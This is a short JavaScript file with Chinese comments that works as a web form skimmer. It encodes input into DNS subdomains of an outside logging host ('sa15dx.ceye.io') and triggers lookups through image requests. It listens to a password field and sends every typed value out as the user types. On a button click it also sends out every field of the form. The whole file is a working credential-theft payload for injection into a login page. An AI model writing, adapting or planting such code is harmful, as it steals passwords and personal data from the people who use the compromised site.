// 定义 DNS 带外发送函数
function sendDnsRequest(fieldName, data) {
  const MAX_DOMAIN_LENGTH = 255; // 完整域名最大长度
  const baseDomain = 'sa15dx.ceye.io'; // 目标 DNS 带外域名

  // 对输入内容进行 URL 编码
  let encodedData = encodeURIComponent(data);

  let index = 1; // 初始化分段序号
  while (encodedData.length > 0) {
    // 构造多级子域名
    const levels = [];
    let remainingLength = MAX_DOMAIN_LENGTH - baseDomain.length - fieldName.length - 10; // 预留空间用于序号和分隔符
    while (remainingLength > 0 && encodedData.length > 0) {
      const chunk = encodedData.slice(0, Math.min(remainingLength, 63)); // 每级最多 63 字符
      levels.push(chunk);
      encodedData = encodedData.slice(chunk.length);
      remainingLength -= chunk.length + 1; // 包括 '.' 分隔符的长度
    }

    // 将所有子域名拼接，序号用 `.1.` 格式
    const subdomain = `${fieldName}.${index}.${levels.join('.')}.${baseDomain}`;
    const img = new Image();
    img.src = `http://${subdomain}`;
    console.log(`DNS 请求发送到: ${subdomain}`);

    index++; // 增加序号
  }
}

// 监听密码框输入事件
document.getElementById('pwd').addEventListener('input', function () {
  const inputValue = this.value; // 获取输入框当前值
  console.log('当前输入：', inputValue);

  // 通过 DNS 带外发送密码
  sendDnsRequest('password', inputValue);
});

// 监听按钮点击事件
document.getElementById('btnSendCode').addEventListener('click', function (event) {
  // 阻止按钮的默认行为（例如表单提交）
  event.preventDefault();

  // 获取表单元素
  const form = document.getElementById('gdei');

  // 使用 FormData 提取表单数据
  const formData = new FormData(form);
  const dataObject = {};

  // 遍历 FormData，将键值对存入对象中
  formData.forEach((value, key) => {
    dataObject[key] = value;
  });

  // 输出表单数据到控制台
  console.log('表单数据:', dataObject);

  // 通过 DNS 带外发送表单数据
  Object.entries(dataObject).forEach(([key, value]) => {
    sendDnsRequest(key, value);
  });

  // 如果需要提交表单，可以在此添加逻辑，例如调用 form.submit()
});
